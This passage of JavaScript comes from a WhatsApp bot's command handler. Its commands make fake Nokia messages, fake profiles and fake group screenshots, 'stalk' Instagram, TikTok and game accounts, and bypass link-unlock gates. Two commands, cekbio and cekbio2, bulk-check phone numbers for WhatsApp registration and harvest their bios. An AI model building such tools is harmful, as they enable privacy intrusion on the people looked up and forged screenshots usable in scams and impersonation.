            const BG_PATH = path.join(__dirname, 'assets', 'nokia_bg.jpg');
            fs.mkdirSync(path.join(__dirname, 'assets'), {
              recursive: true
            });
            const downloadFile = (url, dest) => new Promise((resolve, reject) => {
              if (fs.existsSync(dest)) return resolve();
              const file = fs.createWriteStream(dest);
              const client = url.startsWith('https') ? https : http;
              client.get(url, res => {
                if (res.statusCode !== 200) {
                  fs.unlink(dest, () => {});
                  return reject(new Error(`HTTP ${res.statusCode}`));
                }
                res.pipe(file);
                file.on('finish', () => file.close(resolve));
              }).on('error', err => {
                fs.unlink(dest, () => {});
                reject(err);
              });
            });
            await downloadFile(BG_URL, BG_PATH);
            const pesan = text.trim();
            const bg = await loadImage(BG_PATH);
            const W = bg.width;
            const H = bg.height;
            const canvas = createCanvas(W, H);
            const ctx = canvas.getContext('2d');
            ctx.drawImage(bg, 0, 0, W, H);
            function wrapLine(ctx, text, maxWidth) {
              const words = text.split(' ');
              const wrapped = [];
              let current = '';
              for (const word of words) {
                const test = current ? current + ' ' + word : word;
                if (ctx.measureText(test).width > maxWidth && current) {
                  wrapped.push(current);
                  current = word;
                } else {
                  current = test;
                }
              }
              if (current) wrapped.push(current);
              return wrapped.length ? wrapped : [text];
            }
            const BOX_X = W * 0.083;
            const BOX_Y = H * 0.340;
            const BOX_W = W * 0.850;
            const BOX_H = H * 0.250;
            const FIXED_FONT = Math.floor(H * 0.045);
            const MIN_FONT = 14;
            let fontSize = FIXED_FONT;
            let wrappedLines = [];
            ctx.textAlign = 'left';
            ctx.textBaseline = 'top';
            ctx.fillStyle = '#111111';
            while (fontSize >= MIN_FONT) {
              ctx.font = `bold ${fontSize}px Arial`;
              wrappedLines = wrapLine(ctx, pesan, BOX_W);
              const lineH = fontSize * 1.30;
              const totalH = wrappedLines.length * lineH;
              if (totalH <= BOX_H) break;
              fontSize -= 2;
            }
            const lineHeight = fontSize * 1.30;
            const startY = BOX_Y + (BOX_H - wrappedLines.length * lineHeight) / 2;
            ctx.save();
            ctx.beginPath();
            ctx.rect(BOX_X, BOX_Y, BOX_W, BOX_H);
            ctx.clip();
            ctx.font = `bold ${fontSize}px Arial`;
            wrappedLines.forEach((line, i) => {
              const y = startY + i * lineHeight;
              if (y > BOX_Y + BOX_H - lineHeight) return;
              ctx.fillText(line, BOX_X, y);
            });
            ctx.restore();
            const buffer = canvas.toBuffer('image/jpeg', {
              quality: 0.95
            });
            await client.sendMessage(m.chat, {
              image: buffer,
              caption: '📱 Fake Nokia Message'
            }, {
              quoted: m
            });
          } catch (e) {
            console.log(e);
            xreply('❌ Error fakenokia');
          }
        }
        break;

      /// ───────────── [ 𝖦𝗋𝗈𝗎𝗉 𝖢𝗈𝗇𝗍𝗋𝗈𝗅 ] ──────────── ///
      case 'open':
      case 'buka':
        {
          if (!isOwner) return reply(mess.owner);
          if (!m.isGroup) return reply(mess.group);
          client.groupSettingUpdate(m.chat, 'not_announcement');
          reply("group success opened");
        }
        break;
      case 'close':
      case 'tutup':
        {
          if (!isOwner) return reply(mess.owner);
          if (!m.isGroup) return reply(mess.group);
          client.groupSettingUpdate(m.chat, 'announcement');
          reply("group success closed");
        }
        break;

      /// ───────────── [ 𝖬𝗈𝖻𝗂𝗅𝖾 𝖫𝖾𝗀𝖾𝗇𝖽𝗌 𝖲𝗍𝖺𝗅𝗄𝖾𝗋 ] ──────────── ///
      case 'mlstalk':
      case 'cekml':
      case 'stalkml':
        {
          try {
            if (!text) {
              return xreply(`*Usage format:*

${prefix + command} 541247863|8179

*Example :*
${prefix + command} 541247863|8179`);
            }
            let [userid, zoneid] = text.split("|");
            if (!userid || !zoneid) {
              return xreply(`❌ wrong format!

example:
${prefix + command} 541247863|8179`);
            }
            Reply("⏳ fetching the account data Mobile Legends...");
            const axios = require("axios");
            const api = `https://bintangapi.my.id/api/stalker/ml?user_id=${encodeURIComponent(userid.trim())}&zone_id=${encodeURIComponent(zoneid.trim())}`;
            const {
              data
            } = await axios.get(api);
            if (!data.success) {
              return xreply("❌ ID or Zone ID not found.");
            }
            const res = data.data;
            let teks = `乂 *MOBILE LEGENDS STALK*

╭━━━〔 🎮 ACCOUNT INFO 〕━━⬣
┃ 👤 Nickname : ${res.nickname}
┃ 🆔 User ID : ${res.user_id}
┃ 🌐 Zone ID : ${res.zone_id}
┃ 🌍 Region : ${res.region}
╰━━━━━━━━━━━━━━━━⬣

> Powered By Akoya-MD`;
            await client.sendMessage(m.chat, {
              text: teks
            }, {
              quoted: m
            });
          } catch (e) {
            console.log(e);
            xreply(`❌ failed to fetch data!

${e.message}`);
          }
        }
        break;

      /// ───────────── [ 𝖳𝗂𝗄𝖳𝗈𝗄 𝖤𝖺𝗋𝗇𝗂𝗇𝗀𝗌 ] ──────────── ///
      case 'ttstalk':
      case "tiktokearnings":
        {
          try {
            const username = text?.trim();
            if (!username) {
              return xreply(example("mrbeast"));
            }
            await xreply("⏳ fetching the data TikTok...");
            const apiUrl = "https://api.nexray.eu.cc/tools/tiktokearnings?username=" + encodeURIComponent(username);
            const response = await axios.get(apiUrl, {
              timeout: 60000
            });
            const data = response.data;
            console.log("TIKTOK EARNINGS RESPONSE:", JSON.stringify(data, null, 2));
            if (!data?.status || !data?.result) {
              return xreply("❌ Data TikTok not found.");
            }
            const result = data.result;
            const followers = Number(result.followers || 0);
            const likes = Number(result.average_likes || 0);
            const earnings = Number(result.earnings || 0);
            const engagement = Number(result.engagement || 0);
            const formatNumber = num => {
              return new Intl.NumberFormat("en-GB").format(num);
            };
            const formatMoney = num => {
              return new Intl.NumberFormat("en-US", {
                style: "currency",
                currency: "USD"
              }).format(num);
            };
            const teks = `🎵 *TIKTOK EARNINGS*\n` + `━━━━━━━━━━━━━━━━━━\n` + `👤 Name: *${result.name || username}*\n` + `🔗 Username: *@${username.replace(/^@/, "")}*\n\n` + `👥 Followers: *${formatNumber(followers)}*\n` + `❤️ Average Likes: *${formatNumber(likes)}*\n` + `📹 Posts: *${formatNumber(Number(result.posts || 0))}*\n` + `💰 Estimated Earnings: *${formatMoney(earnings)}*\n` + `📈 Engagement: *${engagement}%*\n\n` + `━━━━━━━━━━━━━━━━━━\n` + `🤖 Source: Akoya-MD`;
            await xreply(teks);
          } catch (err) {
            console.error("TIKTOK EARNINGS ERROR:", err?.response?.data || err);
            return xreply("❌ failed to fetch data TikTok.\n" + "Make sure username correct or the API is having issues.");
          }
        }
        break;

      /// ───────────── [ 𝖡𝗒𝗉𝖺𝗌𝗌 𝖴𝖱𝖫 ] ──────────── ///
      case "bypassurl":
      case "bypass2":
      case "bypasslink":
        {
          try {
            if (!text) {
              return reply(`usage example:

${prefix + command} https://linkvertise.com/access/1239053/55d5Jdz1eY7h`);
            }
            if (!/^https?:\/\//i.test(text)) {
              return reply("❌ Enter URL valid.");
            }
            Reply("⏳ Bypassing the URL...");
            const axios = require("axios");
            const api = `https://bintangapi.my.id/api/tools/bypassurl2?url=${encodeURIComponent(text)}`;
            const {
              data
            } = await axios.get(api, {
              timeout: 60000
            });
            if (!data?.success) {
              return reply("❌ failed membypass URL.");
            }
            const result = data.data?.result || "-";
            const original = data.data?.url || text;
            let hasil = `*✅ BYPASS URL success*

🔗 *Original URL:*
${original}

📂 *Result Bypass :*
${result}

> Powered By Akoya-MD`;
            await client.sendMessage(m.chat, {
              text: hasil
            }, {
              quoted: m
            });
          } catch (e) {
            console.log(e);
            Reply(`❌ failed membypass URL.

${e.response?.data?.message || e.message}`);
          }
        }
        break;
      case 'skiplink':
        {
          if (!text) return xreply(`example:.skiplink https://sub4unlock.co/S9oU0`);
          xreply('wett');
          try {
            let api = `https://fgsi.koyeb.app/api/tools/skip/sub4unlock?apikey=APIKEY&url=${encodeURIComponent(text)}`;
            let {
              data: json
            } = await axios.get(api);
            if (!json.status || !json.data?.linkGo) {
              return xreply("you enter url did you even enter 😂");
            }
            await xreply(`${json.data.linkGo}`);
          } catch (err) {
            xreply(`Eror: ${err.message}`);
          }
        }
        ;
        break;
      case 'subs4unlock':
        {
          if (!text) {
            return xreply(`Masukkan URL subs4unlock!
example: ${prefix + command} https://subs4unlock.id/xxxxx`);
          }
          try {
            await xreply("⏳ Processing...");
            const apiUrl = `https://api.theresav.biz.id/bypass/subs4unlock?url=${encodeURIComponent(text)}&apikey=SurGG`;
            const res = await fetch(apiUrl);
            const data = await res.json();
            if (data.status || data.result) {
              let message = `[ SUBS4UNLOCK BYPASS ]\n\n`;
              message += `Input URL: ${data.input || text}\n`;
              message += `Result URL: ${data.result}\n`;
              message += `Method: ${data.method || "Theresa API"}`;
              xreply(message);
            } else {
              xreply(`failed bypass URL.`);
            }
          } catch (error) {
            console.error(error);
            xreply(`an error occurred:
${error.message}`);
          }
        }
        ;
        break;

      /// ───────────── [ 𝖢𝖾𝗄 𝖡𝗂𝗈 𝖭𝗈𝗆𝗈𝗋 ] ──────────── ///
      case "cekbio2":
        {
          try {
            if (!text) return reply(`example:
${prefix + command} 62812xxxx,62813xxxx`);
            let input = text.replace(/\n/g, ",").replace(/\s/g, "");
            let numbers = input.split(",").filter(v => v);
            if (numbers.length < 1) return reply("enter at least 1 number.");
            Reply(`⏳ checking ${numbers.length} number...`);
            let withBio = [];
            let noBio = [];
            let notReg = [];
            const batchSize = 15;
            for (let i = 0; i < numbers.length; i += batchSize) {
              const batch = numbers.slice(i, i + batchSize);
              await Promise.allSettled(batch.map(async nomor => {
                let jid = nomor.replace(/\D/g, "") + "@s.whatsapp.net";
                try {
                  const check = await client.onWhatsApp(jid);
                  if (!check || !check[0]?.exists) {
                    notReg.push(nomor);
                    return;
                  }
                  try {
                    const status = await client.fetchStatus(jid);
                    if (status && status.status && status.status.trim() !== "") {
                      withBio.push({
                        nomor,
                        bio: status.status,
                        setAt: status.setAt || "-"
                      });
                    } else {
                      noBio.push(nomor);
                    }
                  } catch {
                    noBio.push(nomor);
                  }
                } catch {
                  notReg.push(nomor);
                }
              }));
              await new Promise(resolve => setTimeout(resolve, 1000));
            }
            let hasil = `*bio check result*

`;
            hasil += `✅ Total Checked : ${numbers.length}\n`;
            hasil += `📝 with bio: ${withBio.length}\n`;
            hasil += `📵 No bio / Privacy : ${noBio.length}\n\n`;
            if (withBio.length) {
              hasil += `*──── with bio (${withBio.length}) ────*\n\n`;
              for (let x of withBio) {
                let waktu = "-";
                if (x.setAt && x.setAt !== "-") {
                  let d = new Date(x.setAt);
                  if (!isNaN(d)) {
                    waktu = d.toLocaleString("en-GB");
                  }
                }
                hasil += `📱 ${x.nomor}\n`;
                hasil += `📝 ${x.bio}\n`;
                hasil += `⏰ ${waktu}\n\n`;
              }
            } else {
              hasil += "*──── with bio ────*\n(Empty)\n\n";
            }
            hasil += `*──── NO BIO / PRIVATE (${noBio.length}) ────*\n`;
            if (noBio.length) {
              hasil += noBio.join("\n");
            } else {
              hasil += "(empty)";
            }
            await Reply(hasil);
            let hasil2 = `*DATA number not registered*

`;
            hasil2 += `🚫 Total : ${notReg.length}\n\n`;
            if (notReg.length) {
              hasil2 += notReg.join("\n");
            } else {
              hasil2 += "(empty)";
            }
            await Reply(hasil2);
          } catch (e) {
            console.log(e);
            Reply("an error occurred while checking the bio.");
          }
        }
        break;
      case "cekbio":
        {
          try {
            if (!text) return reply(`example:
${prefix + command} 62812xxxx,62813xxxx`);
            let input = text.replace(/\n/g, ",").replace(/\s/g, "");
            let numbers = input.split(",").filter(v => v);
            if (numbers.length < 1) return reply("enter at least 1 number.");
            Reply(`⏳ checking ${numbers.length} number...`);
            let withBio = [];
            let noBio = [];
            let notReg = [];
            const batchSize = 15;
            for (let i = 0; i < numbers.length; i += batchSize) {
              const batch = numbers.slice(i, i + batchSize);
              await Promise.allSettled(batch.map(async nomor => {
                let jid = nomor.replace(/\D/g, "") + "@s.whatsapp.net";
                try {
                  const check = await client.onWhatsApp(jid);
                  if (!check || !check[0]?.exists) {
                    notReg.push(nomor);
                    return;
                  }
                  try {
                    const status = await client.fetchStatus(jid);
                    if (status && status.status && status.status.trim() !== "") {
                      withBio.push({
                        nomor,
                        bio: status.status,
                        setAt: status.setAt || "-"
                      });
                    } else {
                      noBio.push(nomor);
                    }
                  } catch {
                    noBio.push(nomor);
                  }
                } catch {
                  notReg.push(nomor);
                }
              }));
              await new Promise(resolve => setTimeout(resolve, 1000));
            }
            let hasil = `*bio check result*

`;
            hasil += `✅ Total : ${numbers.length}\n`;
            hasil += `📝 with bio: ${withBio.length}\n`;
            hasil += `📵 No bio: ${noBio.length}\n`;
            hasil += `🚫 not registered: ${notReg.length}\n\n`;
            if (withBio.length) {
              hasil += "*── with bio ──*\n\n";
              for (let x of withBio) {
                let waktu = "-";
                if (x.setAt && x.setAt !== "-") {
                  let d = new Date(x.setAt);
                  if (!isNaN(d)) {
                    waktu = d.toLocaleString("en-GB");
                  }
                }
                hasil += `📱 ${x.nomor}\n`;
                hasil += `📝 ${x.bio}\n`;
                hasil += `⏰ ${waktu}\n\n`;
              }
            }
            if (noBio.length) {
              hasil += "*── NO BIO ──*\n";
              hasil += noBio.join("\n");
              hasil += "\n\n";
            }
            if (notReg.length) {
              hasil += "*── not registered ──*\n";
              hasil += notReg.join("\n");
            }
            Reply(hasil);
          } catch (e) {
            console.log(e);
            Reply("an error occurred while checking the bio.");
          }
        }
        break;
      case 'cekbio3':
        {
          if (!q) return reply(`*Syntax Error*\nExample:\n${command} 628xxxx`);
          let nomor = q.replace(/[^0-9]/g, '');
          const jid = nomor + '@s.whatsapp.net';
          try {
            const result = await client.fetchStatus(jid);
            if (!result || !result.status) {
              return client.sendMessage(m.chat, {
                text: `❌ Bio not found / the user has no bio`
              }, {
                quoted: m
              });
            }
            const waktu = result.setAt ? new Date(result.setAt).toLocaleString('en-GB', {
              timeZone: 'Asia/Jakarta'
            }) : '-';
            const teks = `
*Akoya-MD bio check*
- number: +${nomor}
- Bio: ${result.status}
- Update Bio: ${waktu}

© Copyright By Akoya-MD`;
            await client.sendMessage(m.chat, {
              text: teks
            }, {
              quoted: qloc
            });
          } catch (e) {
            await client.sendMessage(m.chat, {
              text: `❌ failed to fetch bio.
Error: ${e}`
            }, {
              quoted: qloc
            });
          }
        }
        break;

      /// ───────────── [ 𝖥𝖺𝗄𝖾 𝖯𝗋𝗈𝖿𝗂𝗅𝖾 ] ──────────── ///
      case 'fakeprofil':
        {
          let q = m.quoted ? m.quoted : m;
          let mime = (q.msg || q).mimetype || '';
          if (!/image/.test(mime)) return xreply("please reply to a photo for turned into photo profil!");
          if (!text) return xreply("wrong format!\nexample: *fakeprofil Akoya-MD|+628xxx|Akoya-MD*");
          let [username, nomor, bio] = text.split('|');
          if (!username || !nomor || !bio) return xreply("Format must using separator |\nexample: *Name|number|Bio*");
          await xreply("processing, please wait...");
          try {
            const {
              createCanvas,
              loadImage
            } = require('@napi-rs/canvas');
            const bgUrl = 'https://img2.pixhost.to/images/9139/747073049_rafaofficial.jpg';
            const background = await loadImage(bgUrl);
            const canvas = createCanvas(1125, 2436);
            const ctx = canvas.getContext('2d');
            ctx.drawImage(background, 0, 0, 1125, 2436);
            let imgBuffer = await q.download();
            const profileImg = await loadImage(imgBuffer);
            const avatarX = 562.5;
            const avatarY = 450;
            const radius = 172;
            ctx.save();
            ctx.beginPath();
            ctx.arc(avatarX, avatarY, radius, 0, Math.PI * 2, true);
            ctx.closePath();
            ctx.clip();
            ctx.drawImage(profileImg, avatarX - radius, avatarY - radius, radius * 2, radius * 2);
            ctx.restore();
            ctx.textBaseline = 'middle';
            ctx.textAlign = 'center';
            ctx.font = 'bold 74px Arial, sans-serif';
            ctx.fillStyle = '#FFFFFF';
            ctx.fillText(username.trim(), 562.5, 680);
            ctx.font = '500 44px Arial, sans-serif';
            ctx.fillStyle = '#8E8E93';
            ctx.fillText(nomor.trim(), 562.5, 775);
            ctx.textAlign = 'left';
            ctx.font = '44px Arial, sans-serif';
            ctx.fillStyle = '#FFFFFF';
            ctx.fillText(bio.trim(), 95, 1160);
            let buffer = canvas.toBuffer('image/jpeg');
            await client.sendMessage(m.chat, {
              image: buffer,
              caption: `*Fake Profile Selesai!*`
            }, {
              quoted: m
            });
          } catch (err) {
            console.error(err);
            xreply("an error occurred in the Canvas system.");
          }
        }
        break;

      /// ───────────── [ 𝖥𝖺𝗄𝖾 𝖦𝗋𝗈𝗎𝗉 ] ──────────── ///
      case 'fakegrup':
        {
          try {
            if (!/image/.test(mime)) return xreply(example("Akoya-MD|500 by sending/replying with a photo"));
            if (!text) return xreply(example("Akoya-MD|500"));
            let [nama, peserta] = text.split("|");
            if (!nama || !peserta) {
              return xreply(`wrong format!

example:
${prefix + command} Akoya-MD|500`);
            }
            await xreply("⏳ creating Fake Group...");
            const media = await client.downloadAndSaveMediaMessage(qmsg);
            const {
              ImageUploadService
            } = require('node-upload-images');
            const service = new ImageUploadService('pixhost.to');
            let {
              directLink
            } = await service.uploadFromBinary(fs.readFileSync(media), 'Akoya-md.jpg');
            const profile = directLink.toString();
            const api = `https://api.azbry.com/api/maker/igc?profile=${encodeURIComponent(profile)}&nama=${encodeURIComponent(nama)}&peserta=${encodeURIComponent(peserta)}`;
            await client.sendMessage(m.chat, {
              image: {
                url: api
              },
              caption: `乂 *FAKE GROUP success*

📛 *Name group:* ${nama}
👥 *Count Participants :* ${peserta}

> Powered By Akoya-MD`
            }, {
              quoted: m
            });
            fs.unlinkSync(media);
          } catch (e) {
            console.log(e);
            xreply(`❌ an error occurred!

${e.message}`);
          }
        }
        break;

      /// ───────────── [ 𝖨𝗇𝗌𝗍𝖺𝗀𝗋𝖺𝗆 𝖲𝗍𝖺𝗅𝗄𝖾𝗋 ] ──────────── ///
      case 'igstalk':
        {
          try {
            const axios = require('axios');
            if (!text) return xreply(`*Usage example:*\n${prefix + command} timothyronaldd`);
            await xreply("⏳ fetching the data Instagram...");
            const {
              data
            } = await axios.get(`https://api.synoxcloud.xyz/stalker/instagram?username=${encodeURIComponent(text)}`);
            if (!data.status) {
              return xreply("❌ Username not found or failed to fetch data.");
            }
            const meta = data.result.metadata || {};
            const user = data.result.stories?.data?.user || {};
            const caption = `
╭━━━〔 📸 INSTAGRAM STALK 〕━━⬣
┃ 👤 Username : ${user.username || text}
┃ 🏷️ name: ${user.full_name || '-'}
┃ 🆔 ID : ${user.id || '-'}
┃ 🌍 Negara : ${data.result.stories?.data?.country || '-'}
┃ ✔️ Verified : ${user.is_verified ? 'Ya' : "No"}
┃ 🔒 Private : ${user.is_private ? 'Ya' : "No"}
┃ 📂 Kategori : ${user.category_name || '-'}
┃ 💼 Business : ${user.business_category_name || '-'}
┃
┃ 📝 Bio :
┃ ${user.biography || '-'}
┃
┃ 👥 Followers : ${meta.followers || user.edge_followed_by || 0}
┃ ➕ Following : ${meta.following || user.edge_follow || 0}
┃ 🖼️ Postingan : ${meta.posts || user.edges_count || 0}
┃ 🔗 Website :
┃ ${user.external_url || '-'}
╰━━━━━━━━━━━━━━━━━━⬣

📦 *Postingan Terbaru:* ${user.edges?.length || 0}
`;
            await client.sendMessage(m.chat, {
              image: {
                url: meta.avatar || user.profile_pic_url
              },
              caption
            }, {
              quoted: m
            });
            if (user.edges && user.edges.length > 0) {
              let teks = '📸 *Latest posts*\n\n';
              user.edges.slice(0, 10).forEach((v, i) => {
                const tanggal = v.taken_at ? new Date(v.taken_at * 1000).toLocaleString('en-GB') : '-';
                teks += `*${i + 1}. ${v.is_video ? '🎬 Video' : '🖼️ Foto'}*\n`;
                teks += `❤️ Like : ${v.like_count || 0}\n`;
                teks += `💬 Komentar : ${v.comment_count || 0}\n`;
                teks += `📅 Upload : ${tanggal}\n`;
                if (v.video_url) teks += `🎬 Video : ${v.video_url}\n`;
                teks += `🖼️ image: ${v.display_url}\n\n`;
              });
              await xreply(teks);
            }
          } catch (e) {
            console.log(e);
            xreply(`❌ an error occurred.

${e.message}`);
          }
        }
        break;

      /// ───────────── [ 𝖯𝗍𝖾𝗋𝗈𝖽𝖺𝖼𝗍𝗒𝗅 𝖨𝗇𝗌𝗍𝖺𝗅𝗅𝖾𝗋 ] ──────────── ///
      case "ffnews":
        {
          try {
            const axios = require("axios");
            await xreply("⏳ fetching the news Free Fire...");
            const {
              data
            } = await axios.get("https://api.nexray.eu.cc/berita/ffnews");
            if (!data.status) {
              return xreply("❌ failed to fetch news.");
            }
            const berita = data.result.data;
            if (!berita || berita.length === 0) {
              return xreply("❌ news not found.");
            }
            let teks = `╭━━〔 📰 *FREE FIRE NEWS* 〕━━⬣
┃ 📑 Total : ${data.result.total}
┃ 🕒 Update : ${data.timestamp}
╰━━━━━━━━━━━━━━⬣

`;
            for (let i = 0; i < berita.length; i++) {
              teks += `*${i + 1}. ${berita[i].title}*\n`;
              teks += `📅 ${berita[i].date}\n`;
              teks += `🔗 ${berita[i].link}\n\n`;
            }
            await client.sendMessage(m.chat, {
              text: teks
            }, {
              quoted: m
            });
          } catch (e) {
            console.log(e);
            xreply(`❌ Error\n${e.message}`);
          }
        }
        break;

      /// ───────────── [ 𝖣𝖾𝗍𝗂𝗄 𝖭𝖾𝗐𝗌 ] ──────────── ///
      case 'detikcom':
        {
          try {
            await xreply("⏳ fetching the news from Detik...");
            const axios = require("axios");
            const {
              data
            } = await axios.get("https://api.synoxcloud.xyz/berita/detik");
            if (!data || data.statusCode !== 200 || !data.result) {
              return xreply("❌ API did not return valid data.");
            }
            const berita = data.result;
            if (!Array.isArray(berita) || berita.length === 0) {
              return xreply("❌ no news available when.");
            }
            let teks = `📰 *DETIKCOM NEWS UPDATE*\n`;
            teks += `━━━━━━━━━━━━━━━\n\n`;
            berita.slice(0, 10).forEach((item, i) => {
              const title = item.title || "No Title";
              const link = item.link || "-";
              const time = item.time ? `⏰ ${item.time}\n` : "";
              teks += `*${i + 1}. ${title}*\n`;
              teks += `${time}`;
              teks += `🔗 ${link}\n\n`;
            });
            teks += `━━━━━━━━━━━━━━━\n`;
            teks += `📊 Total API: ${data.total || berita.length}`;
            xreply(teks);
          } catch (e) {
            console.log("Error secondscom:", e);
            xreply("❌ failed to fetch news (API error / koneksi failed).");
          }
        }
        break;

      /// ───────────── [ 𝖦𝖯𝖳 𝖤𝖽𝗂𝗍 𝖨𝗆𝖺𝗀𝖾 ] ──────────── ///
      case "editgpt":
        {
          try {
            if (!text) {
              return xreply(`usage example:

.editgpt https://g.top4top.io/p_3820pfcz81.jpg,Make it sharper

Format:
.editgpt imageUrl,prompt`);
            }
            let [imageUrl, prompt] = text.split(",");
            if (!imageUrl || !prompt) {
              return xreply(`wrong format!

example:
.editgpt https://g.top4top.io/p_3820pfcz81.jpg,Make it sharper`);
            }
            await xreply("⏳ processing image with GPT Image...");
            let api = `https://api.synoxcloud.xyz/edit/gpt-image?imageUrl=${encodeURIComponent(imageUrl.trim())}&prompt=${encodeURIComponent(prompt.trim())}`;
            await client.sendMessage(m.chat, {
              image: {
                url: api
              },
              caption: `🖼️ *GPT IMAGE EDITOR*

🔗 Image URL: ${imageUrl}
📝 Prompt: ${prompt}

✅ success processed`
            }, {
              quoted: m
            });
          } catch (e) {
            console.log(e);
            xreply(`Error:\n${e.message}`);
          }
        }
        break;
      case "edit":
        {
          try {
            if (!text) return xreply(`usage example:

.edit Change it to a two-finger pose

Reply/send the photo, then add that caption`);
            if (!/image/.test(mime)) {
              return xreply("reply to a photo with the caption.edit prompt");
            }
            await xreply("⏳ editing the image...");
            let media = await client.downloadAndSaveMediaMessage(qmsg);
            const {
              ImageUploadService
            } = require('node-upload-images');
            const service = new ImageUploadService('pixhost.to');
            let {
              directLink
            } = await service.uploadFromBinary(fs.readFileSync(media), 'rafaofficial.png');
            let api = `https://api.synoxcloud.xyz/edit/nanobanana?url=${encodeURIComponent(directLink)}&prompt=${encodeURIComponent(text)}`;
            await client.sendMessage(m.chat, {
              image: {
                url: api
              },
              caption: `🍌 *Nano Banana Edit*

📝 Prompt: ${text}`
            }, {
              quoted: m
            });
            fs.unlinkSync(media);
          } catch (e) {
            console.log(e);
            xreply(`Error:\n${e.message}`);
          }
        }
        break;

      /// ───────────── [ 𝖠𝗎𝗍𝗈 𝖠𝖨 𝖢𝗁𝖺𝗍 ] ──────────── ///
      case "claudeai2":
        {
          if (!isOwner) return xreply("owner only");
          global.autoClaude2 ??= {};
          if (!text) {
            return xreply(`example:

.claudeai2 on
.claudeai2 off

Status: ${global.autoClaude2[m.chat] ? "ON ✅" : "OFF ❌"}`);
          }
          if (text.toLowerCase() === "on") {
            global.autoClaude2[m.chat] = true;
            return xreply("✅ Auto Claude AI 2 enabled");
          }
          if (text.toLowerCase() === "off") {
            delete global.autoClaude2[m.chat];
            return xreply("❌ Auto Claude AI 2 Inactive");
          }
        }
        break;
      case "claudeai":
        {
          if (!isOwner) return xreply("owner only");
          global.autoClaude ??= {};
          if (!text) {
            return xreply(`example:

.claudeai on
.claudeai off

Status: ${global.autoClaude[m.chat] ? "ON ✅" : "OFF ❌"}`);
          }
          if (text.toLowerCase() === "on") {
            global.autoClaude[m.chat] = true;
            return xreply("✅ Auto Claude AI enabled");
          }
          if (text.toLowerCase() === "off") {
            delete global.autoClaude[m.chat];
            return xreply("❌ Auto Claude AI Inactive");
          }
        }
        break;

      /// ───────────── [ 𝖢𝗎𝖺𝖼𝖺 & 𝖪𝖺𝗅𝖾𝗇𝖽𝖾𝗋 ] ──────────── ///
      case 'cuaca':
        {
          try {
            if (!text) {
              return xreply(`usage example:

.cuaca tanjungbalai`);
            }
            const axios = require('axios');
            let {
              data
            } = await axios.get(`https://api.synoxcloud.xyz/search/cuaca?kota=${encodeURIComponent(text)}`);
            if (!data.status) {
              return xreply("Data cuaca not found");
            }
            let res = data.data;
            let cuaca = {
              0: 'Cerah',
              1: 'Cerah Berawan',
              2: 'Sebagian Berawan',
              3: 'Berawan',
              45: 'Berkabut',
              48: 'Kabut Tebal',
              51: 'Gerimis Ringan',
              53: "Gerimis ",
              55: 'Gerimis Lebat',
              61: 'Hujan Ringan',
              63: "Hujan ",
              65: 'Hujan Lebat',
              71: 'Salju Ringan',
              73: "Salju ",
              75: 'Salju Lebat',
              80: 'Hujan Lokal Ringan',
              81: "Hujan Lokal ",
              82: 'Hujan Lokal Lebat',
              95: 'Badai Petir'
            };
            let caption = `🌦️ *WEATHER INFO*\n\n`;
            caption += `🏙️ Kota : ${res.kota}\n`;
            caption += `🌍 Negara : ${res.negara}\n`;
            caption += `🌡️ Suhu : ${res.suhu_celsius}°C\n`;
            caption += `💨 Angin : ${res.kecepatan_angin_kmh} km/j\n`;
            caption += `☁️ Kondisi : ${cuaca[res.kode_cuaca] || res.kode_cuaca}\n`;
            caption += `🕒 time: ${res.waktu}\n`;
            await xreply(caption);
          } catch (e) {
            console.log(e);
            xreply("failed to fetch data cuaca");
          }
        }
        break;
      case 'cekkalender':
      case 'createkalender':
        {
          let args = text.split(' ');
          if (args.length < 2) return reply("wrong format! Usage: ckalender month year");
          let month = args[0];
          let year = args[1];
          if (isNaN(month) || isNaN(year)) return xreply("Month and year must be numbers!");
          let apiUrl = `https://fastrestapis.fasturl.cloud/maker/calendar/simple?month=${month}&year=${year}`;
          client.sendMessage(m.chat, {
            image: {
              url: apiUrl
            },
            caption: `calendar for month ${month} year ${year}`
          }, {
            quoted: m
          });
        }
        break;
      case "cekgempa":
        {
          xreply("Processing the search");
          try {
            const response = await fetch("https://data.bmkg.go.id/DataMKG/TEWS/autogempa.json");
            const data = await response.json();
            if (!data || !data.Infogempa || !data.Infogempa.gempa) {
              return xreply("failed to get data gempa from BMKG.");
            }
            const gempa = data.Infogempa.gempa;
            let caption = `*📈 LATEST EARTHQUAKE*\n\n`;
            caption += `*Date:* ${gempa.Tanggal}\n`;
            caption += `*Time:* ${gempa.Jam}\n`;
            caption += `*Magnitudo:* ${gempa.Magnitude}\n`;
            caption += `*Kedalaman:* ${gempa.Kedalaman}\n`;
            caption += `*Lokasi:* ${gempa.Wilayah}\n`;
            caption += `*Koordinat:* ${gempa.Lintang} ${gempa.Bujur}\n`;
            caption += `*Potensi:* ${gempa.Potensi}\n`;
            caption += `*Felt:* ${gempa.Dirasakan}\n\n`;
            caption += `Sumber: BMKG (https://www.bmkg.go.id/)`;
            if (gempa.Shakemap) {
              const shakemapUrl = `https://data.bmkg.go.id/DataMKG/TEWS/${gempa.Shakemap}`;
              await client.sendMessage(m.chat, {
                image: {
                  url: shakemapUrl
                },
                caption: caption
              }, {
                quoted: m
              });
            } else {
              client.sendMessage(m.chat, {
                text: caption
              }, {
                quoted: m
              });
            }
          } catch (error) {
            console.log(error);
            xreply("an error occurred while fetching data gempa.");
          }
        }
        break;

      /// ───────────── [ 𝖥𝖺𝗄𝖾 𝖬𝗈𝗏𝗂𝖾 ] ──────────── ///
      case 'fakemovi4':
        {
          try {
            if (!text) {
              return xreply(`usage example:

.fakemovi4 stop yapping so much, agreed?`);
            }
            let quote = text.trim();
            let api = `https://api.synoxcloud.xyz/canvas/quotes-v5?text=${encodeURIComponent(quote)}`;
            await client.sendMessage(m.chat, {
              image: {
                url: api
              },
              caption: `🎬 *FAKE MOVI V4*

💬 Text :
${quote}`
            }, {
              quoted: m
            });
          } catch (e) {
            console.error(e);
            xreply("failed to create the quotes V4");
          }
        }
        break;
      case 'fakemovi3':
        {
          try {
            if (!text) {
              return xreply(`usage example:

.fakemovi3 do not beg for attention from other people`);
            }
            let quote = text.trim();
            let api = `https://api.synoxcloud.xyz/canvas/quotes-v4?text=${encodeURIComponent(quote)}`;
            await client.sendMessage(m.chat, {
              image: {
                url: api
              },
              caption: `🎬 *FAKE MOVI V3*

💬 Text :
${quote}`
            }, {
              quoted: m
            });
          } catch (e) {
            console.error(e);
            xreply("failed to create the quotes V4");
          }
        }
        break;
      case 'fakemovi2':
        {
          try {
            if (!text) {
              return xreply(`usage example:

